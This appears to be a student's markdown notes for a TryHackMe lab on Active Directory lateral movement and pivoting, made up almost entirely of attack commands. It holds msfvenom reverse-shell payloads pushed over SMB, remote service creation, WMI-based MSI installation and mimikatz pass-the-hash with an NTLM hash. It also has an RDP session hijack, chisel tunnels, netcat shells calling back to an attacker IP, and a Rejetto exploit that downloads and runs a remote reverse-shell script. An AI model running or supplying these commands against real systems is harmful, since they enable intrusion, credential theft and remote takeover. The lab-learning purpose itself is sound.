---
tags:
  - THM
  - AD
  - Pentesting
---

# Lateral Movement and Picvting

```bash
search za.tryhackme.com
nameserver 10.200.104.101
nameserver 9.9.9.9

# Shorten name resolution timeouts to 1 second
options timeout:1
# Only attempt to resolve a hostname 2 times
options attempts:2
```

`nslookup thmdc.za.tryhackme.com`

> <http://distributor.za.tryhackme.com/creds>

```bash
export user=leon.jennings
export pass=Password!
export dom=za.tryhackme.com
```

`ssh za\\${user}@thmjmp2.${dom}`

## Task 3

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=VPN-IP-ADDRESS LPORT=443 -f exe-service -o helper.exe

smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_leonard.summers%EZpass4ever' -c 'put servicehelper.exe' --option="client min protocol=core"
```

`sudo nc -lnvp 443`

```powershell
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.100.182 443"
```

```powershell
sc.exe \\thmiis.za.tryhackme.com create helper binpath= "%windir%\servicehelper.exe" start= auto
```

`sudo nc -lnvp 443`

```powershell
sc.exe \\thmiis.za.tryhackme.com start helper
```

## Task 4

```bash
export dom=ZA.TRYHACKME.COM
export user=t1_corine.waters
export pass=Korine.1994
export domUser="${dom}\\${user}"
```

```bash
ssh za\\${user}@thmjmp2.${dom}
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=443 -f msi > servicehelper.msi

smbclient -c 'put servicehelper.msi' -U $user -W ZA '//thmiis.za.tryhackme.com/admin$/' $pass

sudo msfconsole
use multi/handler
set LHOST lateralmovement
set LPORT 443
set payload windows/x64/shell_reverse_tcp
exploit

```

```powershell
powershell.exe

$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\servicehelper.msi"; Options = ""; AllUsers = $false}
```

```powershell
# reverese shell

whoami
nt authority\system

cd C:\Users\t1_corine.waters\Desktop
.\Flag.exe
```

## Task 5

```bash
export dom=ZA.TRYHACKME.COM
export user=t2_felicia.dean
export pass=iLov3THM!
export domUser="${dom}\\${user}"
```

`ssh za\\${user}@thmjmp2.${dom}`

```bash
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O 'mimikatz.zip'

sudo python3 -m http.server 80
```

```powershell
powershell.exe -ExecutionPolicy Bypass
Invoke-WebRequest 'http://10.50.100.182/mimikatz.zip' -OutFile .\mimikatz.zip
Expand-Archive .\mimikatz.zip
cd .\mimikatz\x64
```

```powershell
#mimikatz
privilege::debug
token::elevate
sekurlsa::msv
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe 10.50.100.182 443"
```

```bash
sudo nc -lnvp 443
```

## TASK 6

> <http://distributor.za.tryhackme.com/creds_t2>

```bash
export user=t2_charlie.holland
export pass=Five2016
export dom=za.tryhackme.com
```

```shell
xfreerdp /v:thmjmp2.$dom /u:$user /p:$pass
```

```cmd
# cmd as admin
C:\tools\psexec64.exe -accepteula -s -i cmd.exe
```

```powershell
# on success new ps windows opens
# -------------------------------

query session
tscon 2 /dest:rdp-tcp#10
```

## TASK 7

```bash
export dom=ZA.TRYHACKME.COM
export user=leon.jennings
export pass=Password!


ssh $user@$dom@thmjmp2@$dom
```

```bash
gunzip -c chisel_1.7.7_linux_amd64.gz > chisel
gunzip -c chisel_1.7.7_windows_amd64.gz > chisel.exe
```

```bash
sudo python -m http.server 80
```

```powershell
# ssh jumphost connection
# -----------------------

powershell.exe
Invoke-WebRequest 'http://10.50.100.182/chisel.exe' -OutFile .\chisel.exe

# Script block
# Start a chisel forward SOCKS5 proxy
# Listen on TCP/50000
$scriptblock = { Start-Process "$args\chisel.exe" -ArgumentList @('server', '--port', 50000, '--socks5') }

# -ArgumentList $PWD.Path
# This will substitute for $args in the script block
# Will provide an absolute path to the chisel.exe binary
Start-Job -ScriptBlock $scriptblock -ArgumentList $PWD.Path
```

```bash
sudo nmap -Pn -p50000 -T4 thmjmp2.za.tryhackme.com

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-15 17:06 EDT
Nmap scan report for thmjmp2.za.tryhackme.com (10.200.104.249)

Host is up (0.039s latency).
PORT      STATE SERVICE
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

```bash
sudo ./chisel client thmjmp2.za.tryhackme.com:50000 8443:socks &
```

```bash
sudo vim /etc/proxychains4.conf
```

comment out all other proxys and add `socks5 127.0.0.1 8444`

```bash
sudo proxychains -q nmap -Pn -sT -sV -p80 -T4 thmdc.za.tryhackme.com
```

```powershell
# ssh jumphost connection
# -----------------------

# Change --socks5 to --reverse
# Change 50000 to 51000 since our original server is still running
$scriptblock = { Start-Process "$args\chisel.exe" -ArgumentList @('server', '--port', 51000, '--reverse') }
Start-Job -ScriptBlock $scriptblock -ArgumentList $PWD.Path
```

```bash
# Open 50080 on thmjmp2, forward to 80 on Kali to servee the .ps1 reverse shell
# Open 50081 on thmjmp2, forward to 81 on Kali for reverse shell
sudo ./chisel client thmjmp2.za.tryhackme.com:51000 R:50080:127.0.0.1:80 R:50081:81 &

wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1

vim mini-reverse.ps1
# replace the first line with
# $socket = new-object System.Net.Sockets.TcpClient('thmjmp2.za.tryhackme.com', 50081);

searchsploit Rejetto
searchsploit -m 49125

proxychains -q python3 49125.py thmdc.za.tryhackme.com 80 "C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://thmjmp2.za.tryhackme.com:50080/mini-reverse.ps1')"

sudo rlwrap nc -lnvp 81
```
